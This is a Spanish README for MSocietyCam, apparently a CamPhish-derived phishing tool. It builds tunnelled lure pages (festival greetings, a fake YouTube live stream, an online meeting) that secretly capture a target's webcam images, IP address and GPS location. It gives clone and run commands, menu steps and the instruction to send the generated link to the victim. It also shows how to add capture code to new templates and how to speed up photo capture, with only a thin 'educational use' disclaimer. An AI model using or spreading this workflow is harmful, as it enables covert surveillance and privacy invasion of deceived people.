# 📸 MSocietyCam - Herramienta de Captura Remota

**MSocietyCam** es una herramienta avanzada para pruebas de seguridad que permite capturar imágenes de la cámara web del objetivo mediante ingeniería social. Utiliza servidores de túnel (Ngrok/Cloudflare) para redirigir tráfico y simular páginas legítimas.

> ⚠️ **ADVERTENCIA**: Esta herramienta es solo para **fines educativos y pruebas de seguridad autorizadas**. El uso malintencionado es ilegal.

---

## 🌟 Características
- 🌐 **Túneles soportados**: Ngrok y Cloudflare
- 🎭 **Plantillas personalizables**:
  - Deseos de festival 🎉
  - YouTube en vivo 📺
  - Reunión en línea 💻
- 📍 **Geolocalización**: Opcionalmente captura ubicación GPS
- 📱 **Multiplataforma**: Funciona en Windows, Linux y macOS

---

## 🛠 Instalación

### Requisitos:
- PHP
- Ngrok/Cloudflared (se instala automáticamente)
- Conexión a Internet

```bash
git clone https://github.com/M-Societyy/msocietycam
cd msocietycam
chmod +x msocietycam.sh
```

---

## 🚀 Uso Básico

Ejecuta el script:
```bash
./msocietycam.sh
```

1. **Elige el método de túnel**:
   ```
   [1] Ngrok (Recomendado)
   [2] Cloudflare
   ```

2. **Selecciona una plantilla**:
   ```
   [1] Deseos de festival
   [2] YouTube en vivo
   [3] Reunión en línea
   ```

3. **Personaliza** (según plantilla):
   - Nombre del festival 🎄
   - ID de video de YouTube 🆔

4. **Envía el enlace generado** a tu objetivo.

---

## ⚙️ Personalización Avanzada

### Ajustar velocidad de captura:
Edita la plantilla correspondiente (ej. `OnlineMeeting.html`):
```javascript
// Cambia este valor (en milisegundos)
setInterval(function(){ ... }, 1000);  // 1 foto/segundo
```

### Añadir nuevas plantillas:
1. Crea un archivo HTML en `/templates`
2. Incluye el mecanismo de captura:
   ```javascript
   // Ejemplo mínimo:
   navigator.mediaDevices.getUserMedia({ video: true })
     .then(stream => {
        // Captura frames aquí
     });
   ```

---

## 📂 Estructura de Archivos
```
msocietycam/
├── templates/          # Plantillas HTML
├── saved/             # Datos capturados
│   ├── ips.txt        # Direcciones IP
│   └── locations/     # Ubicaciones GPS
├── post.php           # Procesador de imágenes
└── msocietycam.sh     # Script principal
```

---

## 📜 Licencia
Este proyecto está bajo licencia **MIT**. Úsalo responsablemente.

> 🙏 **Créditos**: Basado en [TechChip's CamPhish](https://github.com/techchipnet/CamPhish) con mejoras adicionales.

---

## 📬 Contacto
¿Preguntas o sugerencias?  
  💻 [Discord](https://discord.gg/9QRngbrMKS)
